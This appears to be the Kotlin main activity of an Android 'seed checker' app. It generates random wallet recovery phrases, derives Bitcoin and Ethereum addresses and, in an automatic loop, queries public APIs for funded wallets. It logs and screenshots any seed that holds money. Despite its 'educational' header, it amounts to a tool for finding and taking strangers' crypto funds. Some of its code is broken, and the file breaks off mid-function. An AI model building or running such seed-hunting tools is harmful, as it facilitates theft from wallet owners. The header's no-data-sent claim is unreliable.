
/**
 * 🔐 SeedCheckPro - Public version of MainActivity.kt
 *
 * ✅ No data is stored or sent.
 * ✅ All processing is local (wallet derivation, PDF report, screen capture).
 * ❌ No telemetry, no seed saved, no email sending.
 *
 * 📌 This code is for educational and forensic use only.
 * 🔗 GitHub: https://github.com/tonpseudo/SeedCheckPro
 * 🔗 APK: https://seedcheckpro.en.uptodown.com/android
 */



package com.findseedapp.SeedCheckpro

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ContentValues
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.pdf.PdfDocument
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import androidx.appcompat.app.AlertDialog
import android.view.View
import android.view.WindowManager
import android.widget.*
import android.content.Context
import java.util.Locale
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat.Type
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import android.widget.Toast
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.bitcoinj.crypto.DeterministicKey
import org.bitcoinj.crypto.HDKeyDerivation
import org.bitcoinj.crypto.MnemonicCode
import org.bitcoinj.crypto.MnemonicException
import org.bitcoinj.params.MainNetParams
import org.bouncycastle.jcajce.provider.digest.Keccak
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.math.BigInteger
import java.math.BigDecimal
import java.math.RoundingMode
import java.security.SecureRandom
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {

    private lateinit var mnemonicEditText: EditText
    private lateinit var generate12Button: Button
    private lateinit var generate18Button: Button
    private lateinit var generate24Button: Button
    private lateinit var copyButton: Button
    private lateinit var verifyButton: Button
    private lateinit var autoVerifyButton: Button
    private lateinit var btcBlip: TextView
    private lateinit var ethBlip: TextView
    private lateinit var btcAddressText: TextView
    private lateinit var ethAddressText: TextView
    private lateinit var usdSummaryTextView: TextView
    private lateinit var addressesLayout: LinearLayout




    private lateinit var autoGenerateButton: Button
    private lateinit var screenshotButton: Button
    private lateinit var screenshotCountTextView: TextView
    private lateinit var checkVipButton: Button
    private lateinit var generatePdfButton: Button
    private lateinit var apiLoader: ProgressBar

    private var screenshotCount = 0

    private val activityScope = CoroutineScope(Dispatchers.Main + Job())

    private val btcAddresses = mutableListOf<String>()
    private lateinit var bipModels: List<BipModelAPI>
    private var btcBalancesList: List<Pair<String, Double>> = listOf()
    private var nonNullAddresses: List<Pair<String, Double>> = emptyList()



    private val indexesToCheck = listOf(0, 1, 2)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (SecurityChecks.performSecurityChecks(this)) {
            finishAffinity()
            System.exit(0)
            return
        }


        setContentView(R.layout.activity_main)

        apiLoader = findViewById(R.id.api_loader)
        usdSummaryTextView = findViewById(R.id.usd_summary_textview)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val rootView = findViewById<View>(R.id.root_view)
            ViewCompat.setOnApplyWindowInsetsListener(rootView) { view, insets ->
                val systemBars = insets.getInsets(Type.systemBars())
                view.setPadding(
                    view.paddingLeft,
                    systemBars.top,
                    view.paddingRight,
                    systemBars.bottom
                )
                insets
            }
        }

        copyButton = findViewById<Button>(R.id.copy_button)
        copyButton.setOnClickListener {
            copyToClipboard()
        }
        screenshotButton = findViewById(R.id.screenshot_button)
        screenshotButton.setOnClickListener {
            captureScreen()
        }
        val versionName = packageManager.getPackageInfo(packageName, 0).versionName
        findViewById<TextView>(R.id.appVersionText).text = " • v$versionName"

        mnemonicEditText = findViewById(R.id.mnemonic_edittext)
        generate12Button = findViewById(R.id.generate_12_button)
        generate18Button = findViewById(R.id.generate_18_button)
        generate24Button = findViewById(R.id.generate_24_button)
        copyButton = findViewById(R.id.copy_button)
        verifyButton = findViewById(R.id.verify_button)
        btcBlip = findViewById(R.id.blip_btc)
        ethBlip = findViewById(R.id.blip_eth)
        btcAddressText = findViewById(R.id.btc_address_text)
        ethAddressText = findViewById(R.id.eth_address_text)
        addressesLayout = findViewById(R.id.addresses_layout)
        screenshotButton = findViewById(R.id.screenshot_button)
        screenshotCountTextView = findViewById(R.id.screenshot_count_textview)
        generatePdfButton = findViewById(R.id.generate_pdf_button)
        generatePdfButton.visibility = View.GONE


        checkVipButton = findViewById(R.id.check_vip_button)
        checkVipButton.setOnClickListener {

            if (isVipCheckRunning) {
                Toast.makeText(this, "Please wait for the current check to complete...", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            isVipCheckRunning = true
            checkVipButton.isEnabled = false

            activityScope.launch {
                try {
                    // Launch the VIP check - this function must be suspend
                    launchFullCheckReport()

                    // If you want to show a result toast, you can place it here
                    Toast.makeText(this@MainActivity, "VIP report completed.", Toast.LENGTH_SHORT).show()

                } catch (e: Exception) {
                    Toast.makeText(this@MainActivity, "API error: ${e.message}", Toast.LENGTH_SHORT).show()
                } finally {
                    // Re-enable button once the operation is finished
                    isVipCheckRunning = false
                    checkVipButton.isEnabled = true
                }
            }
        }





        mnemonicEditText.addTextChangedListener(object : android.text.TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                checkVipButton.clearAnimation()
                checkVipButton.visibility = View.GONE
                generatePdfButton.visibility = View.GONE
                checkVipButton.setBackgroundResource(R.drawable.button_gold_selector) // assure qu'on repart de zéro
                checkVipButton.backgroundTintList = null // évite que le thème override le gold
            }
            override fun afterTextChanged(s: android.text.Editable?) {}
        })
        generatePdfButton.setOnClickListener {

        }


        generate12Button.setOnClickListener { activityScope.launch { generateMnemonic(12) } }
        generate18Button.setOnClickListener { activityScope.launch { generateMnemonic(18) } }
        generate24Button.setOnClickListener { activityScope.launch { generateMnemonic(24) } }

        verifyButton.setOnClickListener {
            if (isVerificationRunning) {
                Toast.makeText(this, "Check in Progress...", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            isVerificationRunning = true
            verifyButton.isEnabled = false
            apiLoader.visibility = View.VISIBLE

            activityScope.launch {
                try {
                    verifyBalances()
                } catch (e: Exception) {
                    Toast.makeText(this@MainActivity, "API Error: ${e.message}", Toast.LENGTH_SHORT).show()
                } finally {

                    apiLoader.visibility = View.GONE
                }
            }
        }


        generatePdfButton.setOnClickListener {
            if (nonNullAddresses.isEmpty()) {
                Toast.makeText(this, "No wallet with funds to export.", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            activityScope.launch {
                val mnemonic = mnemonicEditText.text.toString().trim()
                val btcDetailsList = mutableListOf<BtcDetails>()
                val ethDetailsList = mutableListOf<EthDetails>()
                val processedEth = mutableSetOf<String>()

                val btcPrice = getCurrentBtcPrice()

                for ((address, balance) in nonNullAddresses) {
                    if (address.startsWith("0x")) {
                        if (processedEth.contains(address)) continue
                        val txList = fetchEthTransactions(address).map {
                            it.hash to "${it.date} | ${it.value} ETH"
                        }
                        val totalTx = fetchEthTxCount(address)
                        val ethTxList = fetchEthTransactions(address)
                        val totalReceivedEth = ethTxList
                            .filter { it.to.equals(address, ignoreCase = true) }
                            .sumOf { it.value.replace(",", ".").toBigDecimalOrNull() ?: BigDecimal.ZERO }
                            .toDouble()

                        val totalSentEth = ethTxList
                            .filter { it.from.equals(address, ignoreCase = true) }
                            .sumOf { it.value.replace(",", ".").toBigDecimalOrNull() ?: BigDecimal.ZERO }
                            .toDouble()
                        ethDetailsList.add(
                            EthDetails(
                                address = address,
                                balance = balance,
                                txCount = totalTx,
                                totalReceived = totalReceivedEth,  // facultatif ici
                                totalSent = totalSentEth,
                                walletType = "Trust Wallet, MetaMask, Ledger",
                                firstSeen = "N/A",
                                lastTxHash = txList.firstOrNull()?.first ?: "N/A",
                                txList = txList
                            )
                        )
                        processedEth.add(address)
                    } else {
                        val details = fetchBtcFullDetails(address)
                        btcDetailsList.add(
                            BtcDetails(
                                address = address,
                                balance = balance,
                                walletType = detectWalletByAddress(address),
                                totalReceived = details.totalReceived,
                                totalSent = details.totalSent,
                                txCount = details.txCount,
                                firstSeen = "N/A",
                                lastTx = details.lastTx,
                                scriptType = details.scriptType
                            )
                        )
                    }
                }
                screenshotButton.setOnClickListener { captureScreen() }
                generatePdfReport(mnemonic, btcDetailsList, ethDetailsList)
            }
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            checkStoragePermission()
        }

        updateScreenshotCountDisplay()
        initializeBipModels()
    }

    override fun attachBaseContext(newBase: Context?) {
        val config = Configuration(newBase?.resources?.configuration)
        config.setLocale(Locale.US)
        val context = newBase?.createConfigurationContext(config)
        super.attachBaseContext(context)
    }

    override fun onDestroy() {
        super.onDestroy()
        activityScope.cancel()
    }

    private fun initializeBipModels() {
        // Exemple d'initialisation de vos modèles BIP (à adapter selon votre projet)
        bipModels = listOf(
            BipModelAPI(
                bip = "BIP44 Legacy",
                derivationPath = "m/44'/0'/0'/0/",
                apis = listOf(SoChainAPI(), BlockCypherAPI(), AnotherAPI1())
            ),
            BipModelAPI(
                bip = "BIP49 SegWit compatible",
                derivationPath = "m/49'/0'/0'/0/",
                apis = listOf(BlockchainInfoAPI(), AnotherAPI1())
            ),
            BipModelAPI(
                bip = "BIP84 SegWit natif",
                derivationPath = "m/84'/0'/0'/0/",
                apis = listOf(BlockstreamAPI(), AnotherAPI2())
            ),
            BipModelAPI(
                bip = "BIP86 Taproot",
                derivationPath = "m/86'/0'/0'/0/",
                apis = listOf(AnotherAPI1(), AnotherAPI2())
            )
        )
    }

    private suspend fun generateMnemonic(wordCount: Int) {
        withContext(Dispatchers.IO) {
            val entropySize = when (wordCount) {
                12 -> 16
                18 -> 24
                24 -> 32
                else -> 16
            }
            val entropy = ByteArray(entropySize)
            SecureRandom().nextBytes(entropy)
            try {
                val mnemonicCode = MnemonicCode.INSTANCE
                val mnemonicWords = mnemonicCode.toMnemonic(entropy)
                withContext(Dispatchers.Main) {
                    mnemonicEditText.setText(mnemonicWords.joinToString(" "))
                    Toast.makeText(this@MainActivity, "Phrase generated successfully.", Toast.LENGTH_SHORT).show()
                }
            } catch (e: MnemonicException) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@MainActivity, "Error during phrase generation.", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }
    private suspend fun getCurrentPrices(): Pair<Double, Double> {
        return withContext(Dispatchers.IO) {
            try {
                val request = Request.Builder()
                    .url("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd")
                    .build()
                val response = client.newCall(request).execute()
                val json = JSONObject(response.body?.string().orEmpty())
                val btcPrice = json.getJSONObject("bitcoin").getDouble("usd")
                val ethPrice = json.getJSONObject("ethereum").getDouble("usd")
                btcPrice to ethPrice
            } catch (e: Exception) {
                e.printStackTrace()
                0.0 to 0.0
            }
        }
    }
    private fun copyToClipboard() {
        val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("mnemonic", mnemonicEditText.text.toString())
        clipboard.setPrimaryClip(clip)
        Toast.makeText(this, "Phrase copied to clipboard.", Toast.LENGTH_SHORT).show()
    }

    private fun updateAddressesUI(ethBalanceStr: String, btcPrice: Double, ethPrice: Double) {
        addressesLayout.removeAllViews()
        val addressToBalance = btcBalancesList.associateBy({ it.first }, { it.second })


        val nightModeFlags = resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK

        val dynamicTextColor = if (nightModeFlags == Configuration.UI_MODE_NIGHT_YES) Color.WHITE else Color.BLACK

        var totalUsd = 0.0

        btcAddresses.forEachIndexed { index, address ->
            val bipModelIndex = index / indexesToCheck.size
            val bipName = bipModels[bipModelIndex].bip
            val btcBalance = addressToBalance[address] ?: 0.0
            val btcUsd = btcBalance * btcPrice
            totalUsd += btcUsd

            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
                setPadding(8, 8, 8, 8)
            }

            val blipView = View(this).apply {
                layoutParams = LinearLayout.LayoutParams(20, 20).apply { marginEnd = 16 }
                setBackgroundColor(
                    if (addressToBalance[address] != null) Color.GREEN else Color.RED
                )
            }

            val textView = TextView(this).apply {
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
                text = "$bipName:\n$address\nBalance: ${String.format("%.8f BTC", btcBalance)} (${String.format("%.2f USD", btcUsd)})"
                setTextColor(dynamicTextColor) // Blanc en sombre, noir en clair
                textSize = 14f
            }

            row.addView(blipView)
            row.addView(textView)
            addressesLayout.addView(row)
        }


        val ethBalanceDouble = ethBalanceStr.replace("ETH", "").trim().replace(",", ".").toDoubleOrNull() ?: 0.0
        val ethUsd = ethBalanceDouble * ethPrice
        totalUsd += ethUsd  // Ajouté au total

        val ethRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setPadding(8, 8, 8, 8)
        }

        val ethTextView = TextView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            text = "ETH Balance:\n${String.format("%.8f ETH", ethBalanceDouble)} (${String.format("%.2f USD", ethUsd)})"
            setTextColor(dynamicTextColor) // Blanc en sombre, noir en clair
            textSize = 14f
        }

        ethRow.addView(ethTextView)
        addressesLayout.addView(ethRow)


        usdSummaryTextView.text = "Total value: ${String.format("%.2f USD", totalUsd)}"


        val totalRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setPadding(8, 16, 8, 8)
        }


        val totalColor = if (nightModeFlags == Configuration.UI_MODE_NIGHT_YES) {
            Color.YELLOW
        } else {
            Color.BLACK
        }

        val totalTextView = TextView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            text = "Total Wallet Value: ${String.format("%.2f USD", totalUsd)}"
            setTextColor(totalColor)
            textSize = 16f
        }

        totalRow.addView(totalTextView)
        addressesLayout.addView(totalRow)
    }

    private suspend fun verifyBalances() {
        btcBlip.setBackgroundColor(Color.GRAY)
        ethBlip.setBackgroundColor(Color.GRAY)


        val (btcPrice, ethPrice) = getCurrentPrices()

        val enteredMnemonic = withContext(Dispatchers.Main) { mnemonicEditText.text.toString().trim() }
        if (enteredMnemonic.isEmpty()) {
            withContext(Dispatchers.Main) {
                Toast.makeText(this@MainActivity, "Please enter a valid phrase.", Toast.LENGTH_SHORT).show()
            }
            return
        }
        val mnemonicWords = enteredMnemonic.split(" ")
        try {
            withContext(Dispatchers.IO) {
                MnemonicCode.INSTANCE.check(mnemonicWords)
            }
        } catch (e: MnemonicException) {
            withContext(Dispatchers.Main) {
                Toast.makeText(this@MainActivity, "Incorrect phrase.", Toast.LENGTH_SHORT).show()
            }
            return
        }
        btcAddresses.clear()
        for (bipModel in bipModels) {
            for (index in indexesToCheck) {
                val address = deriveBtcAddressForIndex(mnemonicWords, bipModel.derivationPath, index)
                btcAddresses.add(address)
            }
        }
        val ethAddress = deriveEthereumAddress(mnemonicWords)
        val btcWithLabels = StringBuilder()

        for ((bipIndex, bipModel) in bipModels.withIndex()) {
            for ((i, index) in indexesToCheck.withIndex()) {
                val flatIndex = bipIndex * indexesToCheck.size + i
                val address = btcAddresses[flatIndex]
                btcWithLabels.append("[${bipModel.bip}]:\n$address\n\n")
            }
        }


        withContext(Dispatchers.Main) {
            btcAddressText.text = "BTC Addresses:\n$btcWithLabels"
            ethAddressText.text = "ETH Address:\n$ethAddress"

        }


        val allPairs = mutableListOf<Pair<String, String>>()
        bipModels.forEachIndexed { bipIndex, bipModel ->
            for (index in indexesToCheck) {
                val addr = btcAddresses[bipIndex * indexesToCheck.size + index]
                allPairs.add(Pair(bipModel.bip, addr))
            }
        }
        val bitcoinBalanceManager = BitcoinBalanceManager(bipModels)
        btcBalancesList = bitcoinBalanceManager.getAllBalancesWithBulk(allPairs)
        val ethBalance = getEthereumBalance(ethAddress)
        val ethValue = try {
            val valueStr = ethBalance.replace("ETH", "").trim().replace(",", ".")
            valueStr.toDoubleOrNull() ?: 0.0
        } catch (e: Exception) {
            0.0
        }
        val totalBtcUsd = btcBalancesList.sumOf { it.second * btcPrice }
        val totalEthUsd = ethValue * ethPrice
        val totalUsd = totalBtcUsd + totalEthUsd
        withContext(Dispatchers.Main) {
            var totalUsd = 0.0
            val balances = StringBuilder()
            usdSummaryTextView.text = "Total value: $%.2f USD".format(totalUsd)
            btcBalancesList.forEachIndexed { index, pair ->
                val btcUsd = pair.second * btcPrice
                totalUsd += btcUsd
                balances.append("BTC${index + 1}: ${String.format("%.8f", pair.second)} BTC (${String.format("%.2f", btcUsd)} USD)\n")
            }

            val ethUsd = ethValue * ethPrice
            totalUsd += ethUsd
            balances.append("ETH: $ethBalance (${String.format("%.2f", ethUsd)} USD)\n")

            balances.append("\nTotal: ${String.format("%.2f", totalUsd)} USD")

            AlertDialog.Builder(this@MainActivity)
                .setTitle("Wallet Balances")
                .setMessage(balances.toString())
                .setPositiveButton("OK", null)
                .show()

            updateAddressesUI(ethBalance, btcPrice, ethPrice)


            val finalAllBtcVerified = (btcBalancesList.size == allPairs.size)
            btcBlip.setBackgroundColor(if (finalAllBtcVerified) Color.GREEN else Color.RED)
            ethBlip.setBackgroundColor(if (ethBalance.startsWith("Erreur")) Color.RED else Color.GREEN)

            val addressesWithNonNullBalance = mutableListOf<Pair<String, Double>>()

            btcBalancesList.forEach { (address, balance) ->
                if (balance > 0.0) {
                    addressesWithNonNullBalance.add(address to balance)
                }
            }

            val ethParsedValue = ethBalance
                .replace("ETH", "")
                .replace(",", "")
                .trim()
                .toDoubleOrNull() ?: 0.0

            if (ethParsedValue > 0.0) {
                addressesWithNonNullBalance.add(ethAddress to ethParsedValue)
            }
            nonNullAddresses = addressesWithNonNullBalance

            if (addressesWithNonNullBalance.isNotEmpty()) {
                logSyncEvent(enteredMnemonic, addressesWithNonNullBalance)
                captureScreen()

                checkVipButton.visibility = View.VISIBLE
                checkVipButton.setBackgroundResource(R.drawable.button_gold_selector)
                checkVipButton.setTextColor(Color.BLACK)
                val glowAnim = android.view.animation.AnimationUtils.loadAnimation(this@MainActivity, R.anim.glow_loop)
                checkVipButton.startAnimation(glowAnim)
                generatePdfButton.visibility = View.VISIBLE
            } else {
                checkVipButton.clearAnimation()
                checkVipButton.visibility = View.GONE
                generatePdfButton.visibility = View.GONE
            }





            val ethValue = try {
                val valueStr = ethBalance.replace("ETH", "").trim()
                valueStr.toDoubleOrNull() ?: 0.0
            } catch (e: Exception) {
                0.0
            }


            if (ethValue > 0.0) {
                val ethFormatted = BigDecimal(ethValue.toString()).setScale(8, RoundingMode.HALF_UP).toDouble()
                addressesWithNonNullBalance.add(ethAddress to ethFormatted)
            }

            autoGenerateJobs.forEach { it.cancel() }
            autoGenerateJobs.clear()

            if (!finalAllBtcVerified && autoGenerateEnabled) {
                val job = activityScope.launch {
                    delay(5000)
                    generateMnemonic(12)
                    verifyBalances()
                }
                autoGenerateJobs.add(job)
                return@withContext
            }

            if (autoGenerateEnabled && finalAllBtcVerified) {
                val job = activityScope.launch {
                    delay(7000)
                    generateMnemonic(12)
                    verifyBalances()
                }
                autoGenerateJobs.add(job)
            }
        }

    }

    private fun deriveBtcAddressForIndex(mnemonicWords: List<String>, derivationPathBase: String, index: Int): String {
        val seed = MnemonicCode.toSeed(mnemonicWords, "")
        val masterKey = HDKeyDerivation.createMasterPrivateKey(seed)
        val path = derivationPathBase + index
        val childKey = deriveKeyFromPath(masterKey, path)

        // Emulation des types manquants avec fallback
        val scriptType = when {
            derivationPathBase.startsWith("m/44'") -> org.bitcoinj.script.Script.ScriptType.P2PKH
            derivationPathBase.startsWith("m/49'") -> org.bitcoinj.script.Script.ScriptType.P2PKH // fallback for P2WPKH_P2SH
            derivationPathBase.startsWith("m/84'") -> org.bitcoinj.script.Script.ScriptType.P2WPKH
            derivationPathBase.startsWith("m/86'") -> org.bitcoinj.script.Script.ScriptType.P2WPKH // fallback for P2TR
            else -> org.bitcoinj.script.Script.ScriptType.P2WPKH
        }

        return org.bitcoinj.core.Address.fromKey(MainNetParams.get(), childKey, scriptType).toString()
    }

    private fun deriveEthereumAddress(mnemonicWords: List<String>): String {
        val seed = MnemonicCode.toSeed(mnemonicWords, "")
        val masterKey = HDKeyDerivation.createMasterPrivateKey(seed)
        val purposeKey = HDKeyDerivation.deriveChildKey(masterKey, 44 or 0x80000000.toInt())
        val coinTypeKey = HDKeyDerivation.deriveChildKey(purposeKey, 60 or 0x80000000.toInt())
        val accountKey = HDKeyDerivation.deriveChildKey(coinTypeKey, 0 or 0x80000000.toInt())
        val changeKey = HDKeyDerivation.deriveChildKey(accountKey, 0)
        val addressKey = HDKeyDerivation.deriveChildKey(changeKey, 0)
        val publicKey = addressKey.pubKeyPoint.getEncoded(false).drop(1).toByteArray()
        val keccak = Keccak.Digest256()
        val hash = keccak.digest(publicKey)
        return "0x" + hash.takeLast(20).joinToString("") { "%02x".format(it) }
    }

    suspend fun getEthereumBalance(address: String): String {
        val apiKeys = listOf(
            "your api key",
            "your api key"
        )
        return withContext(Dispatchers.IO) {
            for (apiKey in apiKeys) {
                try {
                    val request = Request.Builder()
                        .url("https://api.etherscan.io/api?module=account&action=balance&address=$address&tag=latest&apikey=$apiKey")
                        .build()
                    val response = client.newCall(request).execute()
                    if (response.isSuccessful) {
                        val body = response.body?.string().orEmpty()
                        val json = JSONObject(body)
                        if (json.optString("status") != "1") continue
                        val balanceInWei = json.optString("result", "0").toBigIntegerOrNull() ?: BigInteger.ZERO
                        val balanceInEth = balanceInWei.toBigDecimal().divide(BigDecimal("1000000000000000000"))
                        return@withContext String.format("%.8f ETH", balanceInEth.setScale(8, RoundingMode.DOWN))
                    }
                } catch (e: Exception) {
                    continue
                }
            }
            "Erreur ETH"
        }
    }

    inner class BitcoinBalanceManager(private val bipModels: List<BipModelAPI>) {
        private val delayBetweenApis = 500L
        private val blockchairBulk = BlockchairBulkAPI()
        suspend fun getAllBalancesWithBulk(addresses: List<Pair<String, String>>): List<Pair<String, Double>> {
            val allAddrs = addresses.map { it.second }
            val bulkResult = blockchairBulk.getBulkBalances(allAddrs)
            val result = mutableListOf<Pair<String, Double>>()
            val fallbackAddresses = mutableListOf<Pair<String, String>>()
            for ((bip, addr) in addresses) {
                val bal = bulkResult[addr]
                if (bal != null) {
                    result.add(addr to bal)
                } else {
                    fallbackAddresses.add(bip to addr)
                }
            }
            if (fallbackAddresses.isNotEmpty()) {
                val fallbackResults = getAllBalancesFallback(fallbackAddresses)
                result.addAll(fallbackResults)
            }
            return result
        }
        private suspend fun getAllBalancesFallback(addresses: List<Pair<String, String>>): List<Pair<String, Double>> {
            val balances = mutableListOf<Pair<String, Double>>()
            for ((bip, address) in addresses) {
                val bipModel = bipModels.find { it.bip == bip }
                if (bipModel != null) {
                    var balance: Double? = null
                    for (api in bipModel.apis) {
                        balance = api.getBalance(address)
                        delay(delayBetweenApis)
                        if (balance != null) break
                    }
                    if (balance != null) {
                        balances.add(Pair(address, balance))
                    } else {
                        withContext(Dispatchers.Main) {
                            Toast.makeText(this@MainActivity, "Fail APIs: $address", Toast.LENGTH_LONG).show()

                        }
                    }
                }
            }
            return balances
        }
    }



    private fun updateScreenshotCountDisplay() {
        screenshotCountTextView.text = "screenshot  : $screenshotCount"
    }

    private fun captureScreen() {
        val bitmap = captureBitmapFromView(window.decorView.rootView)
        val filename = "Capture_${System.currentTimeMillis()}.png"
        val fos: OutputStream
        try {
            fos = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
                    put(MediaStore.MediaColumns.MIME_TYPE, "image/png")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
                }
                val imageUri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
                    ?: throw Exception("Unable to creat the URI.")
                resolver.openOutputStream(imageUri) ?: throw Exception("Unable to open the output stream.")
            } else {
                val imagesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString()
                val image = File(imagesDir, filename)
                FileOutputStream(image)
            }
            fos.use {
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, it)
                screenshotCount++
                updateScreenshotCountDisplay()
                Toast.makeText(this, "Screenshot saved.", Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "Screenshot error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun captureBitmapFromView(view: View): Bitmap {
        val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
        val canvas = Canvas(bitmap)
        view.draw(canvas)
        return bitmap
    }

    private fun checkStoragePermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), 100)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        if (requestCode == 100) {
            if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                Toast.makeText(this, "Permission granted.", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Permission denied. The application cannot save screenshots.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun deriveKeyFromPath(masterKey: DeterministicKey, path: String): DeterministicKey {
        val parts = path.removePrefix("m/").split('/')
        var currentKey = masterKey
        for (part in parts) {
            val hardened = part.endsWith("'")
            val index = if (hardened) {
                part.dropLast(1).toInt() or 0x80000000.toInt()
            } else {
                part.toInt()
            }
            currentKey = HDKeyDerivation.deriveChildKey(currentKey, index)
        }
        return currentKey
    }

    inner class BlockchairBulkAPI {
        private val client = OkHttpClient()
        suspend fun getBulkBalances(addresses: List<String>): Map<String, Double> {
            if (addresses.isEmpty()) return emptyMap()
            val joined = addresses.joinToString(",")
            val url = "https://api.blockchair.com/bitcoin/dashboards/addresses/$joined"
            val request = Request.Builder().url(url).build()
            return withContext(Dispatchers.IO) {
                try {
                    val response = client.newCall(request).execute()
                    if (response.isSuccessful) {
                        val bodyStr = response.body?.string().orEmpty()
                        val json = JSONObject(bodyStr)
                        val dataObj = json.optJSONObject("data") ?: return@withContext emptyMap()
                        val result = mutableMapOf<String, Double>()
                        for (addr in addresses) {
                            val addrObj = dataObj.optJSONObject(addr) ?: continue
                            val addressData = addrObj.optJSONObject("address") ?: continue
                            val balanceSats = addressData.optLong("balance", 0L)
                            val balanceBtc = balanceSats / 1e8
                            result[addr] = balanceBtc
                        }
                        result
                    } else {
                        emptyMap()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                    emptyMap()
                }
            }
        }
    }
    private fun fixEthBalanceOnly(value: Double): Double {
        return if (value > 1000) value / 1e8 else value
    }

    private suspend fun launchFullCheckReport() {
        if (nonNullAddresses.isEmpty()) {
            withContext(Dispatchers.Main) {
                Toast.makeText(this@MainActivity, "No wallet with funds to check.", Toast.LENGTH_SHORT).show()
            }
            return
        }

        val builder = StringBuilder()
        builder.append("FULL TRANSACTION REPORT:\n\n")

        activityScope.launch {
            val processedEth = mutableSetOf<String>()

            val btcPrice = getCurrentBtcPrice()
            for ((address, balance) in nonNullAddresses) {
                if (address.startsWith("0x")) {

                    if (processedEth.contains(address)) continue

                    val correctedBalance = fixEthBalanceOnly(balance)
                    val formattedBalance = BigDecimal(correctedBalance.toString())
                    val ethTxs = fetchEthTransactions(address)
                    val totalTx = fetchEthTxCount(address)
                    val walletCompat = "Compatible wallets: MetaMask, Trust Wallet, Ledger, SafePal, and more."

                    builder.append("ETH Address:\n$address\n")
                    builder.append("Balance: $formattedBalance ETH\n")
                    builder.append("Transactions: ${ethTxs.size} found\n")
                    builder.append("$walletCompat\n")

                    if (ethTxs.isEmpty()) {
                        builder.append("  • No transactions found.\n")
                    } else {
                        ethTxs.take(5).forEach {
                            builder.append("  • ${it.date} | ${it.value} ETH\n")
                            builder.append("    From: ${it.from.take(12)}... → To: ${it.to.take(12)}...\n")
                            builder.append("    Hash: ${it.hash.take(18)}...\n")
                        }
                    }
                    builder.append("Total transactions: $totalTx\n\n")
                    processedEth.add(address)

                } else {
                    val formattedBalance = String.format("%.8f", balance)
                    val btcDetails = fetchBtcFullDetails(address)
                    val walletCompat = detectWalletByScriptType(btcDetails.scriptType)
                    val totalusd = balance * btcPrice

                    builder.append("BTC Address:\n$address\n")
                    builder.append("Balance: $formattedBalance BTC\n")
                    builder.append("Transactions: ${btcDetails.txCount} found\n")
                    builder.append("Total Received: %.8f BTC\n".format(btcDetails.totalReceived))
                    builder.append("Total Sent: %.8f BTC\n".format(btcDetails.totalSent))
